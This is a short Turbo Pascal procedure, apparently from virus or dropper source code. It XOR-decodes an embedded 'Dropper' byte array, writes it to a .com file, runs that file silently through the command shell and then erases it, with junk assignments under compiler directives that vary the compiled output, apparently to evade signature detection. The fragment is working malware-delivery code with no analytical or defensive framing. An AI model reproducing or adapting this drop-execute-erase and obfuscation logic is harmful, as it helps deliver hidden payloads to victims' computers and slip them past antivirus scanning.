   procedure TPPE_1;
   var d:file;
       i,j:{$IFOPT L+}integer{$ELSE}longint{$ENDIF};
   begin
   j:=1;
   for i:=1 to ComLen do
     begin
     {$IFOPT S-}Junk1:='Crack';{$ENDIF}
     Dropper[i]:=dr[i] xor OldKey[j];
     {$IFOPT S+}Junk2:=17;{$ENDIF}
     if j=40 then j:=1 else {$IFOPT T+}inc(j);{$ELSE}j:=j+1;{$ENDIF}
     {$IFOPT D-}Junk3:=True or False;{$ENDIF}
     end;
   assign(d,'tppe.com');rewrite(d,ComLen);
   {$IFOPT V+}Junk3:=False;{$ENDIF}
   blockwrite(d,Dropper,1);
   close(d);
   {$IFOPT L+}Junk2:=36-2;{$ENDIF}
   exec(Command,'/c tppe.com>nul');
   {$IFOPT P-}Junk1:='';{$ENDIF}
   erase(d);
   end;
